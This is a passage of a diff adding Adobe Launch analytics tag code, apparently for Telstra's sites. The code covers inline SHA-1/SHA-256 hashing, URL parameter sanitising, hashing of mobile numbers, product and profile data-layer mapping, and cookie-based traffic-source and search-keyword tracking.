128 }for (l.push(a); l.length % 16 != 14;)l.push(0); for (l.push(p >>> 29), l.push(p << 3 & 4294967295), t = 0; t < l.length; t += 16) { for (a = 0; a < 16; a++)u[a] = l[t + a]; for (a = 16; a <= 79; a++)u[a] = o(u[a - 3] ^ u[a - 8] ^ u[a - 14] ^ u[a - 16], 1); for (n = g, C = i, c = s, f = S, d = m, a = 0; a <= 19; a++)A = o(n, 5) + (C & c | ~C & f) + d + u[a] + 1518500249 & 4294967295, d = f, f = c, c = o(C, 30), C = n, n = A; for (a = 20; a <= 39; a++)A = o(n, 5) + (C ^ c ^ f) + d + u[a] + 1859775393 & 4294967295, d = f, f = c, c = o(C, 30), C = n, n = A; for (a = 40; a <= 59; a++)A = o(n, 5) + (C & c | C & f | c & f) + d + u[a] + 2400959708 & 4294967295, d = f, f = c, c = o(C, 30), C = n, n = A; for (a = 60; a <= 79; a++)A = o(n, 5) + (C ^ c ^ f) + d + u[a] + 3395469782 & 4294967295, d = f, f = c, c = o(C, 30), C = n, n = A; g = g + n & 4294967295, i = i + C & 4294967295, s = s + c & 4294967295, S = S + f & 4294967295, m = m + d & 4294967295 } return (A = e(g) + e(i) + e(s) + e(S) + e(m)).toLowerCase(); // jshint ignore:line
+    },
+    sha256: function sha256 (r) {
+        var n = 8, t = 0; function e(r, n) { var t = (65535 & r) + (65535 & n); return (r >> 16) + (n >> 16) + (t >> 16) << 16 | 65535 & t } function o(r, n) { return r >>> n | r << 32 - n } function u(r, n) { return r >>> n } function a(r, n, t) { return r & n ^ ~r & t } function f(r, n, t) { return r & n ^ r & t ^ n & t } function c(r) { return o(r, 2) ^ o(r, 13) ^ o(r, 22) } function i(r) { return o(r, 6) ^ o(r, 11) ^ o(r, 25) } function h(r) { return o(r, 7) ^ o(r, 18) ^ u(r, 3) } return function (r) { for (var n = t ? "0123456789ABCDEF" : "0123456789abcdef", e = "", o = 0; o < 4 * r.length; o++)e += n.charAt(r[o >> 2] >> 8 * (3 - o % 4) + 4 & 15) + n.charAt(r[o >> 2] >> 8 * (3 - o % 4) & 15); return e }(function (r, n) { var t, C, g, A, d, v, S, l, m, y, w, b = new Array(1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298), p = new Array(1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225), B = new Array(64); r[n >> 5] |= 128 << 24 - n % 32, r[15 + (n + 64 >> 9 << 4)] = n; for (var D = 0; D < r.length; D += 16) { t = p[0], C = p[1], g = p[2], A = p[3], d = p[4], v = p[5], S = p[6], l = p[7]; for (var E = 0; E < 64; E++)B[E] = E < 16 ? r[E + D] : e(e(e(o(w = B[E - 2], 17) ^ o(w, 19) ^ u(w, 10), B[E - 7]), h(B[E - 15])), B[E - 16]), m = e(e(e(e(l, i(d)), a(d, v, S)), b[E]), B[E]), y = e(c(t), f(t, C, g)), l = S, S = v, v = d, d = e(A, m), A = g, g = C, C = t, t = e(m, y); p[0] = e(t, p[0]), p[1] = e(C, p[1]), p[2] = e(g, p[2]), p[3] = e(A, p[3]), p[4] = e(d, p[4]), p[5] = e(v, p[5]), p[6] = e(S, p[6]), p[7] = e(l, p[7]) } return p }(function (r) { for (var t = Array(), e = (1 << n) - 1, o = 0; o < r.length * n; o += n)t[o >> 5] |= (r.charCodeAt(o / n) & e) << 24 - o % 32; return t }(r = function (r) { r = r.replace(/\r\n/g, "\n"); for (var n = "", t = 0; t < r.length; t++) { var e = r.charCodeAt(t); e < 128 ? n += String.fromCharCode(e) : e > 127 && e < 2048 ? (n += String.fromCharCode(e >> 6 | 192), n += String.fromCharCode(63 & e | 128)) : (n += String.fromCharCode(e >> 12 | 224), n += String.fromCharCode(e >> 6 & 63 | 128), n += String.fromCharCode(63 & e | 128)) } return n }(r)), r.length * n)); // jshint ignore:line
+    }
+}
+
+_tdTags.sanitiseUrl = function sanitiseUrl (url) {
+    var excludeQueryParams = /(accountId|accountNum|aid|billNum|bpsession|bundleId|cftoken|cfid|cld|\?data|docid|\?e|email(Id)?|EmailAddress|eun|First_?Name|fqun|_ga|guid|j?sessionid|imsi|Last_?Name|mboxSession|mkt.+?|realmoid|rescuesessionid|rrid|serviceid|signature|smagentname|token|\?p|&p|p_auth|pid|PayerID|ts|tsh|afh|assocEid|pfnn|CEA|message|CField0|CField1|gclid|dclid|searchQuery|salt|bill_receipt|paidDate|amount|nonce|userId)(=|%(25)*3D)([^&#]*)/ig;
+    return (url || "").replace(excludeQueryParams, "$1");
+};
+          
+_tdTags.asciify = function asciify (str) {
+    if (!str) return "";
+    var diacritics = [
+        { c:"A", b:/[\300-\306]/g },
+        { c:"a", b:/[\340-\346]/g },
+        { c:"E", b:/[\310-\313]/g },
+        { c:"e", b:/[\350-\353]/g },
+        { c:"I", b:/[\314-\317]/g },
+        { c:"i", b:/[\354-\357]/g },
+        { c:"O", b:/[\322-\330]/g },
+        { c:"o", b:/[\362-\370]/g },
+        { c:"U", b:/[\331-\334]/g },
+        { c:"u", b:/[\371-\374]/g },
+        { c:"N", b:/[\321]/g },
+        { c:"n", b:/[\361]/g },
+        { c:"C", b:/[\307]/g },
+        { c:"c", b:/[\347]/g },
+        { c:"y", b:/[\377]/g },
+        { c:" ", b:/[\240]/g }
+    ];
+    diacritics.forEach(function(lt) {
+        str = (str + "").replace(lt.b, lt.c);
+    });
+    return (str + "").replace(/[,"']|[^ -:<-~]+/g, "");
+}
+</script><script>_satellite["_runScript4"](function(event, target, Promise) {
+
+_tdTags.setLoggedIn = function(isLoggedIn) {
+	var dirtyLoginStatus = _satellite.cookie.get("s_loggedin") || isLoggedIn + "";
+	var isLoggedInLcl = typeof isLoggedIn !== "boolean" ? /^(logged in|1|true)$/i.test(dirtyLoginStatus) : isLoggedIn;
+	var loggedInStatus = isLoggedInLcl ? "logged in" : "logged out";
+	_satellite.cookie.set("s_loggedin", loggedInStatus, {expires: 30});
+}
+
+_tdTags.setCustomerId = function(id) {
+    // Log error to New Relic
+    var payload = {
+      ruleName: 'Framework | Page Top | 001 | setup tdTags object',
+      functionName: '_tdTags.setCustomerId',
+      errorName: 'deprecated function',
+      errorMessage: '_tdTags.setCustomerId function has been deprecated'
+    }
+
+     _satellite.track('td-newrelic-send', { payload: payload, logType: 'error' } );
+}
+
+_tdTags.mapProduct = function(product, parentProduct) { // product is a generic object used in product, cart & transaction subspaces.
+	var orderInfo = {}; // returned from this function
+	if (product) {
+		var item = {}; // representing orderInfo.cart[n]
+		var info = {}; // representing orderInfo.cart[n].info
+		orderInfo.cart = [];
+		item.qty = product.quantity;
+		item.info = info;
+		if (product.productInfo) {
+			info.sku = product.productInfo.sku;
+			info.code = product.productInfo.sku || product.productInfo.productID;
+			item.code = product.productInfo.sku || product.productInfo.productID;
+			info.model = product.productInfo.productName;
+			info.manufacturer = product.productInfo.manufacturer;
+			info.planSize = product.productInfo.planSize;
+			info.storageSize = product.productInfo.storageSize;
+			info.colour = product.productInfo.color;
+			info.inventoryCount = product.productInfo.inventoryCount;
+			info.simType = product.productInfo.simType;
+			item.purchaseType = product.productInfo.contractType;
+			item.orderType = product.productInfo.orderType;
+			item.redemptionType = product.productInfo.redemptionType;
+			item.term = product.productInfo.contractDuration;
+
+			// Tactical - for Blueprint implementations (TODO: blueprint should align with strategic implementation above)
+			orderInfo.combinedSku = product.productInfo.sku || product.productInfo.productID;
+			orderInfo.deviceSku = product.productInfo.sku || "no device";
+			orderInfo.planSku = product.productInfo.productID || "no plan";
+		}
+		if (product.price) {
+			info.voucher = product.price.voucher;
+			info.currency = product.price.currency;
+			info.deliveryCost = product.price.shipping;
+			info.deliveryType = product.price.shippingMethod;
+			info.costPerMonth = product.price.basePrice;
+			info.minCost = product.price.productTotal;
+			item.minCost = product.price.productTotal;
+		}
+		if (product.voucher) { // Tactical: PCF Postpaid Mobile is storing it in the wrong location
+			item.voucher = product.voucher;
+		}
+		if (product.category) {
+			info.group = product.category.primaryCategory;
+			info.category = product.category.secondaryCategory;
+			info.subCategory = product.category.tertiaryCategory;
+			if (product.category.productType && parentProduct) {
+				if (/addon|redemmption/i.test(product.category.productType)) { // Tactical: PCF created a new redemmption (sic) product category, instead of addon or inclusion. Map it to addons
+					if (!parentProduct.addOns) { parentProduct.addOns = []; }
+					parentProduct.addOns.push(item);
+				}
+				if (/inclusion/i.test(product.category.productType)) {
+					if (!parentProduct.inclusions) { parentProduct.inclusions = []; }
+					parentProduct.inclusions.push(item);
+				}
+			}
+		}
+		if (product.linkedProduct && product.linkedProduct.length) {
+			product.linkedProduct.forEach(function (linkedProduct) {
+				_tdTags.mapProduct(linkedProduct, item);
+			});
+		}
+		if (!parentProduct) {
+            if (!window.omnitureData.dl) window.omnitureData.dl = {};
+			window.omnitureData.dl.productInfo = info; // CR - 17 Mar 20 Fixed missing omnitureData, originallocalDl.productInfo = info;
+			orderInfo.cart.push(item);
+		}
+	}
+	return orderInfo;
+}
+
+_tdTags.getMobileHash = function(num) {
+	num = num + ""; // cast to a string
+    
+    if (num.length >= 64) return num; // Assuming this has already been hashed with sha256
+  
+	num = num && num.replace(/[^\d]+/g, ""); // remove any non-numeric characters
+	if (/^0\d{9}$/.test(num) || /^61\d{9}$/.test(num)) {
+		num = num.replace(/^(0)/, "61");
+		return _tdTags.hash.sha256(num);
+	}
+}
+	
+_tdTags.mapProfile = function(profile) { // profile is a generic object used in transaction & user subspaces.
+	var userInfo = {};
+	if (profile) {
+		if (profile.profileInfo) {
+			userInfo.newRepeat = profile.profileInfo.returningStatus;
+			userInfo.mobileHash = _tdTags.getMobileHash(profile.profileInfo.mobile);
+			userInfo.eloquaId = profile.profileInfo.eloquaID;
+			userInfo.age = profile.profileInfo.age;
+			userInfo.identityType = profile.profileInfo.identityType;
+			userInfo.abnAcn = profile.profileInfo.abnAcn;
+			userInfo.companyName = profile.profileInfo.companyName;
+			userInfo.loggedInUsing = profile.profileInfo.loggedInUsing;
+			userInfo.loggedInTo = profile.profileInfo.loggedInTo;
+			userInfo.loyaltyTier = profile.profileInfo.loyaltyTier;
+			userInfo.loyaltyPoints = profile.profileInfo.loyaltyPoints;
+
+		}
+		if (profile.address) {
+			userInfo.city = profile.address.city;
+			userInfo.state = profile.address.stateProvince;
+			// This is the original implementation but causing problem in TMS Rollout.
+            // orderInfo.zipCode = profile.address.postalCode; // orderInfo is correct; legacy.
+            // For now try to assign it to userInfo.zipCode instead of orderInfo.zipCode
+            userInfo.zipCode = profile.address.postalCode;
+			userInfo.country = profile.address.country;
+		}
+		if (profile.shippingAddress) {
+			userInfo.shippingCity = profile.shippingAddress.city;
+			userInfo.shippingState = profile.shippingAddress.stateProvince;
+			userInfo.shippingZipCode = profile.shippingAddress.postalCode;
+			userInfo.shippingCountry = profile.shippingAddress.country;
+		}
+	}
+	return userInfo;
+}
+});</script><script>_satellite["_runScript5"](function(event, target, Promise) {
+_tdTags.mxo = {};
+_tdTags.mxo.getPrimarySku = function(){
+  var SKU = 'null';
+
+  try {
+    var primaryCategory = _satellite.getVar('DigitalData_Product_Primary_PrimaryCategory').toLowerCase();
+    var secondaryCategory = _satellite.getVar('DigitalData_Product_Primary_SecondaryCategory').toLowerCase();
+    var tertiaryCategory = _satellite.getVar('DigitalData_Product_Primary_TertiaryCategory').toLowerCase();
+    var primarySKU = _satellite.getVar('DigitalData_Product_Primary_SKU');
+
+    if (!primarySKU && primarySKU === '') return SKU;
+
+    if (secondaryCategory == "postpaid" && tertiaryCategory !== '') {
+      SKU = primarySKU.indexOf('|') == -1 ? tertiaryCategory.toLowerCase() : primarySKU.split('|')[0]; //Values are: sim only or product SKU 123456
+      return SKU;
+    }
+    
+    if (primaryCategory !== '' && primaryCategory.indexOf('mobile') > 0 && tertiaryCategory !== '') {
+      SKU = primarySKU.indexOf('|') == -1 ? tertiaryCategory.toLowerCase() : primarySKU.split('|')[0]; //Values are: sim only or product SKU 123456
+      return SKU;
+    }
+    
+    if (secondaryCategory == "broadband" && tertiaryCategory !== '') {
+      SKU = tertiaryCategory.toLowerCase(); // Values are: nbn or adsl
+      return SKU;
+    }
+    
+    if (primaryCategory !== '' && primaryCategory.toLowerCase().indexOf('fixed') > 0 && secondaryCategory !== '') {
+      const productTechType = digitalData.cart.item[0].category.techType || '';
+      
+      if (productTechType && productTechType.toLowerCase() == '5g') {
+        SKU = primarySKU;
+      } else if (secondaryCategory === 'nbn' && primarySKU.toLowerCase().includes('5g')) {
+        SKU = primarySKU // use 5G home SKU instead
+      } else {
+        SKU = secondaryCategory.toLowerCase(); // Values are: nbn or adsl
+      }
+      
+      return SKU;
+    }
+    
+    if (primaryCategory !== '' && primaryCategory.toLowerCase().indexOf('entertainment') > 0 && tertiaryCategory !== '') {
+      SKU = tertiaryCategory.toLowerCase(); // Values are: xbox all access
+      return SKU;
+    }
+    
+    if (secondaryCategory == "accessories" || secondaryCategory == "device&accessory" || secondaryCategory == "loyalty") {
+      SKU = primarySKU;
+      return SKU;
+    }
+    
+    
+    return SKU;
+}  catch (e) {
+    _satellite.logger.warn(event.$rule.name, e);
+
+    // Log error to New Relic
+    payload = {
+        functionName: 'getSKU',
+        ruleName: ruleName,
+        error: e
+    }
+
+    _satellite.track('td-newrelic-error', { payload: payload });
+    
+    return SKU;
+  }
+  
+  return SKU;
+}
+});</script><script>
+_tdTags.setEventTimeStart = function(eventName) {
+	var eventsLog = _satellite.cookie.get("evtime") || {};
+	if (typeof eventsLog == 'string') eventsLog = JSON.parse(eventsLog);
+	eventsLog[eventName] = new Date().getTime();
+	_satellite.cookie.set("evtime", eventsLog, {expires: 1});	// expire in 1d
+}
+
+_tdTags.setEventTimeElapsed = function(eventName, format) {
+	var eventsLog = _satellite.cookie.get("evtime") || {};
+	if (typeof eventsLog == 'string') eventsLog = JSON.parse(eventsLog);
+	if (eventsLog[eventName]) {
+		_tdTags.data.eventInfo[eventName + "=" + _tdTags.getEventTimeElapsed(eventName, format)] = true; // the 10 & 100 math works out 2 decimal places.
+		_tdTags.delEventTime(eventName);
+	}
+}
+
+_tdTags.getEventTimeElapsed = function(eventName, format) {
+	var multiplier = { seconds: 1, minutes: 60, hours: 3600, days: 86400 };
+	var eventsLog = _satellite.cookie.get("evtime") || {};
+	if (typeof eventsLog == 'string') eventsLog = JSON.parse(eventsLog);
+	if (!format) { format = "seconds"; } // assume a default
+	if (eventsLog[eventName]) {
+		var startTime = eventsLog[eventName];
+		var endTime = new Date().getTime();
+		var diff = endTime - startTime;
+		return Math.round(diff / 10 / multiplier[format]) / 100; // the 10 & 100 math works out 2 decimal places.
+	}
+}
+
+_tdTags.delEventTime = function(eventName) {
+	var eventsLog = _satellite.cookie.get("evtime") || {};
+	if (typeof eventsLog == 'string') eventsLog = JSON.parse(eventsLog);
+	if (eventsLog[eventName]) {
+		delete eventsLog[eventName];
+		if (!Object.size(eventsLog)) {
+			_satellite.cookie.set("evtime", "");	// expire in 1d
+		} else {
+			_satellite.cookie.set("evtime", eventsLog, {expires: 1});	// expire in 1d
+		}
+	}
+}
+</script><script>_satellite["_runScript6"](function(event, target, Promise) {
+	_tdTags.setExternalSearch = function() { // Originally: Datalicious Purchase Path v6
+      try {
+		var documentReferrerHost = document.referrer.split("/")[2] || "";
+		var trafficSourceStacking = _satellite.cookie.get("__ppFullPath");
+		var searchKeywordStacking = _satellite.cookie.get("__ppKeywords");
+        var cookieDomain = _satellite.getVar('Cookie_Domain');
+
+		// Cookie grooming - extend it back to 30 days on every page load
+		if (trafficSourceStacking) { _satellite.cookie.set('__ppFullPath', trafficSourceStacking, { expires: 30, domain: cookieDomain }); }
+		if (searchKeywordStacking) { _satellite.cookie.set('__ppKeywords', searchKeywordStacking, { expires: 30, domain: cookieDomain }); }
+
+		// Ignore internal traffic, now removed as requested on DCCOE-27820
+		// if (_tdTags.isFromInternal(documentReferrerHost) && !/plus.telstra.com/i.test(document.location.hostname)) { return; }
+
+		// Determine campaignCode
+		var tcParam = decodeURIComponent(_tdTags.gqp("tc"));
+		var campaignCode = tcParam || "";
+		var shortCode2Ch;
+		var trafficSource;
+
+		if (tcParam) {
+			var tcParam2Ch = tcParam.substring(0, 2).toUpperCase();
+			if (tcParam.indexOf("G|B") === 0) { tcParam2Ch = "GB"; }
+			if (tcParam.indexOf("G|P") === 0) { tcParam2Ch = "GP"; }
+			if (tcParam.indexOf("G|E") === 0) { tcParam2Ch = "GE"; }
+			if (tcParam.indexOf("Y|B") === 0) { tcParam2Ch = "YB"; }
+			if (tcParam.indexOf("Y|P") === 0) { tcParam2Ch = "YP"; }
+			if (tcParam.indexOf("Y|E") === 0) { tcParam2Ch = "YE"; }
+			shortCode2Ch = tcParam2Ch.substring(0, 2);
+          _satellite.cookie.set('tms_tc', tcParam, { domain: cookieDomain, expires: 0.125 }) // expires after 3 hours
+		}
+
+		// These used to be set inside the nested ifs below. I moved these out so the declaration is clearer.
+		var searchKeyword = campaignCode || document.referrer && window.location.host !== documentReferrerHost ? _tdTags.getSearchKeyword(document.referrer) : "";
+		var bPaidTraffic = campaignCode || document.referrer && window.location.host !== documentReferrerHost ? _tdTags.isPaidTraffic() : false;
+
+		// Set Traffic Source/Short Code
+		if (campaignCode) {
+			if (!shortCode2Ch) { shortCode2Ch = campaignCode.substr(0, 2); }
+			shortCode2Ch = shortCode2Ch.replace(/^(di|ob|og|cb|cg|re|rp|sm|sp)$/i, "ca");
+			trafficSource = campaignCode;
+		} else if (!document.referrer) {
+			shortCode2Ch = "di";
+			trafficSource = "direct";
+		} else if (window.location.hostname !== documentReferrerHost) {
+			/**
+			 * cb/cg = c means paid traffic/SEM, b means branded, g means generic
+			 * ob/og = o means search traffic/SEO, b means generic, g means generic
+			 * sp/sm = s means social media, p means paid, m means organic
+			 * rp/re = r means referrals, p means paid, e means organic
+			 **/
+			if (searchKeyword) {
+				shortCode2Ch = (bPaidTraffic ? "c" : "o") + (_tdTags.isBrandedKeyword(searchKeyword) ? "b" : "g");
+				trafficSource = (bPaidTraffic ? "sem:" : "seo:") + (_tdTags.isBrandedKeyword(searchKeyword) ? "branded:" : "generic:") + documentReferrerHost;
+			} else if (_tdTags.isSocialMedia(documentReferrerHost)) {
+				shortCode2Ch = "s" + (bPaidTraffic ? "p" : "m");
+				trafficSource = "social:" + (bPaidTraffic ? "paid:" : "organic:") + documentReferrerHost;
+			} else {
+				shortCode2Ch = "r" + (bPaidTraffic ? "p" : "e");
+				trafficSource = "referral:" + (bPaidTraffic ? "paid:" : "organic:") + documentReferrerHost;
+			}
+		}
+
+		// Save the Traffic Source Stacking String
+		if (shortCode2Ch) {
+			var tssArray = trafficSourceStacking ? trafficSourceStacking.split("-") : [];
+			if (tssArray.length < 2) {
+				tssArray.push(shortCode2Ch);
+			} else if (tssArray.length === 2) {
+				tssArray.push(tssArray[1] + "1"); // add the 3rd item
+				tssArray[1] = shortCode2Ch; // replace 2nd item
+			} else if (tssArray.length > 2) {
+				var secondItem = tssArray[1];
+				var lastItem = tssArray[tssArray.length - 1];
+				if (secondItem === lastItem.substr(0, 2)) { // if the 2ch code matches
+					tssArray[tssArray.length - 1] = secondItem + (Number(lastItem.substr(2)) + 1); // replace last item with a new counter.
+				} else {
+					tssArray.push(secondItem + 1); // add new item, starting from 1
+				}
+				tssArray[1] = shortCode2Ch; // replace 2nd item
+			}
+			trafficSourceStacking = tssArray.join("-").substr(0, 255);
+            _satellite.cookie.set('__ppFullPath', trafficSourceStacking, { expires: 30, domain: cookieDomain });
+		}
+
+		// Save the search keyword stacking
+		if (searchKeyword) {
+			var sksArray = searchKeywordStacking ? searchKeywordStacking.split(">") : [];
+			sksArray.push((bPaidTraffic ? "paid:" : "organic:") + searchKeyword);
+			searchKeywordStacking = sksArray.join(">").substr(0, 255);
+            _satellite.cookie.set('__ppKeywords', searchKeywordStacking, { expires: 30, domain: cookieDomain });
+		}
+
+		// Set external search data layer
+		var searchInfo = {};
+		if (trafficSource) { searchInfo.externalTrafficSource = trafficSource; }
+		if (trafficSourceStacking) { searchInfo.externalTrafficSourceStacking = trafficSourceStacking; }
+		if (searchKeyword) { searchInfo.externalKeyword = searchKeyword; } // unmapped to an eVar
+		if (searchKeywordStacking) { searchInfo.externalKeywordStacking = searchKeywordStacking; }
+      
+        _tdTags.data.searchInfo = searchInfo;
+      
+		return searchInfo;
+      }
+      catch(e) {
+        _satellite.logger.warn(event.$rule.name, e);
+
+        // Log error to New Relic
+        var payload = {
+          ruleName: event.$rule.name,
+          error: e
+        }
+
+         _satellite.track('td-newrelic-error', { payload: payload } );
+      }
+	}
+	
+	/**
+	 * Legacy. Returns the search keyword from a particular search engine. This works
+	 * for search engines using http, but for https, getSearchKeyword no longer works
+	 * correctly for some engines (e.g. Google) due to new privacy updates as the query
+	 * params are no longer available in document.referrer. The search key list has not
+	 * been maintained and does not target all engines.
+	 * @param {string} url - the url to check for the search keyword
+	 * @returns {string} the search parameter if available, or -na-
+	 **/
+	_tdTags.getSearchKeyword = function(url) {
+		var searchKey = [
+			"daum:q", "eniro:search_word", "naver:query", "images.google:q", "google:q", "yahoo:p", "msn:q", "bing:q",
+			"aol:query", "aol:encquery", "lycos:query", "ask:q", "altavista:q", "netscape:query", "cnn:query", "about:terms",
+			"mamma:query", "alltheweb:q", "voila:rdata", "virgilio:qs", "live:q", "baidu:wd", "alice:qs", "yandex:text",
+			"najdi:q", "aol:q", "mama:query", "seznam:q", "search:q", "wp:szukaj", "onet:qt", "szukacz:q", "yam:k", "pchome:q",
+			"kvasir:q", "sesam:q", "ozu:q", "terra:query", "mynet:q", "ekolay:q", "rambler:words"
+		];
+
+		for (var i = 0; i < searchKey.length; i++) {
+			var companyName = searchKey[i].substring(0, searchKey[i].indexOf(":"));
+			var param = searchKey[i].substring(searchKey[i].indexOf(":") + 1, searchKey[i].length);
+			if (url.indexOf(companyName) >= 0) {
+				return decodeURIComponent(_tdTags.gqp(param, document.referrer) || "") || "-na-";
+			}
+		}
+		return "-na-";
+	}
+
+	/**
+	 * Legacy. Checks to see if the supplied URL is an internal URL.
+	 * The URL list has not been maintained so it will return false
+	 * positives.
+	 * @param {string} url - the url to check
+	 * @returns {boolean} true if internal site is detected
+	 */
+	_tdTags.isFromInternal = function(url) {
+		var internalDomains = [
+			"javascript:", "tel:", "servicestatus.bigpond.com", "signon.bigpond.com", "signon2.bigpond.com", "itms:", // jshint ignore:line
+			"itunes.apple.com", "play.google.com", "www.windowsphone.com", "appworld.blackberry.com", "telstra.com", // js hint complains about the javascript URL. It's not created here, just tested against. So let's ignore the warning.
+			"telstra.com.au", "telstrabusiness.com", "telstraenterprise.com", "telstragovernment.com", "telstrasearch.com",
+			"boost.com", "yourtelstratools.telstra.com", window.location.hostname.replace(/^(?!telstra|boost)[^.]*/, "")
+		];
+		for (var i = 0; i < internalDomains.length; i++) {
+			if (url.indexOf(internalDomains[i].toLowerCase()) >= 0) {
+				return true;
+			}
+		}
+		return false;
+	}
+
+	/**
+	 * Legacy. Checks to see if the search keyword contains any
+	 * Telstra brands. This branded terms list has not been maintained
+	 * and will return false positives.
+	 * @param {string} keyword - the key to check for branded terms
+	 * @returns {boolean} true if the keyword has a brand name in it
+	 */
+	_tdTags.isBrandedKeyword = function(keyword) {
+		var brandTerms = ["telstra", "bigpond", "big+pond", "sensis"];
+		for (var i = 0; i < brandTerms.length; i++) {
+			if (keyword.indexOf(brandTerms[i]) >= 0) {
+				return true;
+			}
+		}
+		return false;
+	}
+
+	/**
+	 * Legacy. Checks the URL to see if it contains the tc,
+	 * gclid or s_kwcid query parameters which are only added
+	 * when using external campaigns. This will return false
+	 * positives because the tc parameter's definition has been
+	 * corrupted over the years and is being used for internally
+	 * sourced campaigns (e.g. email distributions, SMS campaigns)
+	 * @returns true if tc, gclid or s_kwcid parameters exist
+	 */
+	_tdTags.isPaidTraffic = function() {
+		var paidTrafficParams = ["tc", "gclid", "s_kwcid"];
+
+		for (var i = 0; i < paidTrafficParams.length; i++) {
+			if (_tdTags.gqp(paidTrafficParams[i])) {
+				return true;
+			}
+		}
+		return false;
+	}
+
+	/**
+	 * Legacy. Checks the URL to see if it is from a social
+	 * media domain. This list has not been maintained so
+	 * any new social media sites are not considered.
+	 * @param {string} url - the url to check for social media domains
+	 * @returns {string} true if it's in our social media domain list
+	 */
+	_tdTags.isSocialMedia = function(url) {
+		var socialMediaDomains = [
+			"facebook.com", "plus.google.com", "twitter.com", "myspace.com", "linkedin.com", "bebo.com", "classmates.com",
+			"cyworld.com", "blackplanet.com", "buzznet.com", "cellufun.com", "flixster.com", "flickr.com", "fotolog.com",
+			"foursquare.com", "friendsreunited.com", "friendster.com", "geni.com", "grono.net", "habbo.com", "hi5.com",
+			"last.fm", "livemocha.com", "mocospace.com", "multiply.com", "myheritage.com", "mylife.com", "my.opera.com",
+			"myyearbook.com", "nk.pl", "netlog.com", "odnoklassniki.ru", "opendiary.com", "orkut.com", "plaxo.com", "qzone.qq.com",
+			"renren.com", "skyrock.com", "sonico.com", "stickam.com", "stumbleupon.com", "studivz.net", "tagged.com", "viadeo.com",
+			"weeworld.com", "weread.com", "spaces.live.com", "xanga.com", "xing.com", "digg.com", "reddit.com"
+		];
+
+		for (var i = 0; i < socialMediaDomains.length; i++) {
+			if (url.indexOf(socialMediaDomains[i]) >= 0) {
+				return true;
+			}
+		}
+		return false;
+	}
+	
+	_tdTags.getProductTerms = function() {
+		// Assertions
+		if (!_tdTags.gqp("tc")) { return; }
+		if (!document.referrer) { return; }
+
+		var searchEngines = [
+			[/^http(|s):\/\/(www\.)?google\./i, /q=([^&]*)/i, "G", "S"],
+			[/^http(|s):\/\/(www\.)?bing\./i, /q=([^&]+)/i, "B", "S"],
+			[/^http(|s):\/\/(www\.)?search\.yahoo\./i, /p=([^&]+)/i, "Y", "S"],
+			[/^http(|s):\/\/(www\.)?search\.msn\./i, /q=([^&]+)/i, "M", "S"],
+			[/^http(|s):\/\/(www\.)?search\.live\./i, /query=([^&]+)/i, "ML", "S"],
+			[/^http(|s):\/\/(www\.)?plus\.url\.google\./i, /url=([^&]+)/i, "GP", "P"],
+			[/^http(|s):\/\/(www\.)?daum\./i, /q=([^&]+)/i, "D", "S"],
+			[/^http(|s):\/\/(www\.)?naver\./i, /query=([^&]+)/i, "N", "S"],
+			[/^http(|s):\/\/(www\.)?sensis\./i, /find=([^&]+)/i, "S", "S"],
+			[/^http(|s):\/\/(www\.)?search\.mywebsearch\./i, /searchfor=([^&]+)/i, "MWS", "S"],
+			[/^http(|s):\/\/(.*)?ask\./i, /q=([^&]+)/i, "A", "S"],
+			[/^http(|s):\/\/(.*)?search-results\./i, /q=([^&]+)/i, "SR", "S"],
+			[/^http(|s):\/\/(.*)?baidu\./i, /wd=([^&]+)/i, "BD", "S"],
+			[/^http(|s):\/\/(.*)?\./i, /q=([^&]+)/i, "O", "S"]
+		];
+
+		var url = window.location.href.split("?")[0].split("#")[0];
+		var referrer = decodeURIComponent(document.referrer);
+
+		for (var i = 0; i < searchEngines.length; i++) {
+			var engine = searchEngines[i];
+			var domainPattern = engine[0];
+			var queryPattern = engine[1];
+			var nameCode = engine[2];
+			var searchCode = referrer.indexOf("source=productsearch") > -1 ? "SH" : engine[3];
+			if (domainPattern.test(referrer)) {
+				var matchedParams = referrer.match(queryPattern);
+				if (matchedParams) {
+					var keyword = nameCode === "GP" ? _tdTags.gqp("gs") : matchedParams[1].toLowerCase();
+					if (!keyword) { searchCode = "SS"; }
+					return (keyword || "unknown").replace(/(\'|")/, "$1") + "|" + url + "|" + nameCode + "|" + searchCode;
+				}
+			}
+		}
+	}
+});</script><script>_satellite["_runScript7"](function(event, target, Promise) {
+function getMappedValue(value, type) {
+  function getValidAsset() {
+    try {
+      var asset = _satellite.getVar('Config_CampaignImpression_Mapping_Asset');
+      var result;
+
+      for (var i = 0; i < asset.length; i++) {
+        if (asset[i].condition) {
+          result = asset[i].asset ;
+          break;
+        }
+      }
+
+      return result;
+    }
+    catch(e) {
+      _satellite.logger.warn(event.$rule.name, e);
+
+      // Log error to New Relic
+      var errorPayload = {
+        ruleName: '_tdTags',
+        functionName: 'getValidAsset',
+        error: e
+      }
+
+       _satellite.track('td-newrelic-send', { payload: errorPayload, logType: 'error' } );
+    }
+  }
+
+  try {
+    var mapping, mappedValue;
+
+    switch (type) {
+      case 'asset':
+        mapping = getValidAsset();
+        mappedValue = mapping;
+        break;
+
+      case 'placement':
+        /**
+        * Detecting placement through Data Element
+        * which capture omnitureData due to need to support
+        * both legacy and strategic tracking
+        * and there are some nuances with detecting My Account and My Telstra
+        **/
+        
+        var omnitureDataPageSection = _satellite.getVar('Page_Info_(Site_Section)').toLowerCase() === 'myaccount' ? 'myaccount-' : '';
+        var isMigratedToLaunch = _satellite.getVar('isMigratedToLaunch');
+
+        if (value.toLowerCase() === 'my telstra') omnitureDataPageSection = 'mytelstra-';
+
+        mapping = _satellite.getVar('Config_CampaignImpression_Mapping_Placement');
+        
+        // First, try mapping it with provided value, which is generally from Primary Category Digital Data Layer
+        mappedValue = mapping[value.toLowerCase()];
+        
+        // Then continuously checking a few more steps if mappedValue is still empty
